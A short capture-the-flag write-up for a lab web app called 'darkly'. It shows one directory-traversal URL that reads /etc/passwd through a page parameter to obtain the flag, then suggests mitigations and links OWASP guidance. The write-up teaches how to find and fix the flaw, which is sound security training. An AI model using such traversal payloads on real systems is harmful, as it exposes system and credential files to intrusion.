# Exploit
We know that darkly runs on a debian system, so we can try reaching for the /etc/passwd file via the URI's page parameter:  

```
http://192.168.0.160/?page=/../../../../../../../etc/passwd
```
This allows us to get the flag.

# Mitigating the risk
You'll find more information on directory traversal and local file inclusions [here](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601), [here](https://owasp.org/www-community/attacks/Path_Traversal) and [here](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.html).

To mitigate this risk, one could use chroot jails, or exclude certain characters (`.` or `..` for instance) from filepaths.  
More to the point, such filepaths should not be determined client-side but server-side.
